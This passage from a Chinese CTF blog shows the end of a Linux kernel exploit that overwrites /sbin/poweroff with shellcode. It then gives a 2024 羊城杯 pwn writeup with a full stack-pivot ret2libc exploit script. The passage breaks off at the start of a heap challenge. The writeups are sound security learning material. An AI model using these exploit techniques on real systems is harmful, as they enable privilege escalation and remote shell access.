</span><br><span class="line">    <span class="keyword">if</span>(write(fd, MMAP_ADDR, <span class="number">0x1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;triger_done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2, t3;</span><br><span class="line">    shm_id = shmget(IPC_PRIVATE, <span class="number">0x1000</span>, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sync_s = (<span class="keyword">struct</span> sync_s *)shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    punch_hole_prepare();</span><br><span class="line">    pthread_create(&amp;t1, <span class="number">0</span>, triger_vuln, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="number">0</span>, trigger_punch_hole, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t3, <span class="number">0</span>, delete_fd, <span class="number">0</span>);</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t3, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open target file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果-3"><a href="#求解效果-3" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/13.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里想分享一下我做题时的心理变化。当时我看见 <code>uaf</code> 直接想着用 <code>USMA</code> 给他秒了，所以调试都懒的调直接一口气把整个 <code>exp</code> 给写完，结果一运行发现内核编译时关闭了某些选项，导致无法执行：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br></pre></td></tr></table></figure><p>也就是说无法使用 <code>USMA</code>，于是我就用正常点打打法去劫持 <code>tty_struct</code> 然后使用 <code>work_for_cpu_fn</code> 一把梭，结果内核直接卡在 <code>work_for_cpu_fn</code> 里面了，想了半天没想明白，最后发现我的 <code>vmlinux</code> 是来自别的题目的😇🤣，当场裂开。把所有地址替换正确也花了点时间，可是程序还是卡在 <code>work_for_cpu_fn</code> 里面，我觉得是我把 <code>fake ops</code> 写到了 <code>tty_struct</code> 占用了某些变量的位置造成的，于是我就用 <code>ret2hbp</code> 想把 <code>fake ops</code> 写到 <code>db_stack</code> 上，结果感觉又是编译时关闭了某些选项？写半天写不上去，直接心态崩了。后面有人提醒我看看能不能用 <code>pt_regs</code>，我看了眼偏移是固定了，于是马上在 <code>pt_regs</code> 上写好 kenrel rop 直接栈迁移过去，中间为了找 <code>init_cred</code> 的地址又不得不把 <code>vmlinux</code> 丢进 <code>ida</code> 里面慢慢找，最后成功把血给搞没了🤣</p><p>感觉自己的水平还是太低了，我还能变得更强把 :-(</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯 2024 pwn writeup</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/</url>
      
        <content type="html"><![CDATA[<p>去年就知道这个比赛很卷，没想到今年更卷。某某战队距离比赛结束还有40分钟时排名第一，比赛结束时排第二十一，真的逆天。<br>这次比赛学长不是在实习就是去帮别的战队打，到头来pwn全都只能我一个人来打，真的好累喵😇。还好题目不是很难，一共五题pwn，前4题很快就打完了，最后一题巨抽象，本地不同的打法都通了，远程死活不同，真是让人道心破碎捏。</p><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>这是本次比赛的签到题，主逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start the construction for stack overflow exploit.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在<code>0x10</code>字节的溢出。由于只能覆盖<code>rbp</code>和<code>ret</code>，所以需要栈迁移，然后<code>ret2libc</code>，这里我栈迁移了2次，第一次用来泄露地址，第二次用来getshell。可是不知道是不是环境的问题，我本地打<code>system(&quot;/bin/sh&quot;)</code>死活都不通，打<code>execve(&quot;/bin/sh&quot;,0,0)</code>发现栈迁移后溢出的字节不够我写rop链，最后只能使用libc上的gadget来使其满足其中一个<code>one_gadget</code>来getshell😇<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">31213</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>,<span class="number">0xebce2</span>,<span class="number">0xebd38</span>,<span class="number">0xebd3f</span>,<span class="number">0xebd43</span>]</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601500</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(ret)+p64(elf.symbols[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ogg)):</span><br><span class="line">    ogg[i] += libc_base</span><br><span class="line"></span><br><span class="line">data = <span class="number">0x0000000000601700</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data) + p64(<span class="number">0x4006C4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span> + p64(data-<span class="number">0x30</span>) + p64(<span class="number">0x4006D0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_r13 = <span class="number">0x0000000000041c4a</span> + libc_base</span><br><span class="line">pop_r12 = <span class="number">0x0000000000035731</span> + libc_base</span><br><span class="line">pop_rbp = <span class="number">0x000000000002a2e0</span> + libc_base</span><br><span class="line">execve = libc.symbols[<span class="string">&#x27;execve&#x27;</span>] + libc_base</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rbp)+p64(<span class="number">0x601780</span>)+p64(ogg[<span class="number">5</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><p>这是本次比赛唯一的堆风水题，其题目大概的意思是让我们输入路径，然后有个函数叫<code>Dijkstra</code>用来计算最短路劲，这里先看堆块是申请的</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/1.png" class="" title="我的图图呢">  <p>可以看见堆块的大小和我们选用的交通工具有关系，能申请的堆块大小有<code>0x520/0x530/0x540</code></p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/2.png" class="" title="我的图图呢">  <p>free函数中存在十分明显的<code>UAF</code>漏洞</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/3.png" class="" title="我的图图呢">  <p>edit函数只能够使用一次，而且在使用前需要满足<code>edit_flag2</code>变量的值为<code>true</code>，这个变量的值可以通过<code>Dijkstra</code>函数计算当前城市距离<code>guangzhou</code>的距离是否大于<code>2000</code>来改变</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png" class="" title="我的图图呢">  <p>可以由于add函数对路径的长度有限制，所以正常情况下这个条件是无法满足的<br>求解思路为利用堆风水合理构造堆块获取一次<code>edit</code>机会，然后<code>largebin attack</code>打<code>_IO_list_all</code>。由于这里开启了沙箱，所以我们使用<code>orw</code>读出flag。这题的栈地址远程和本地有 <code>8</code> 字节的偏差，逆天<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span 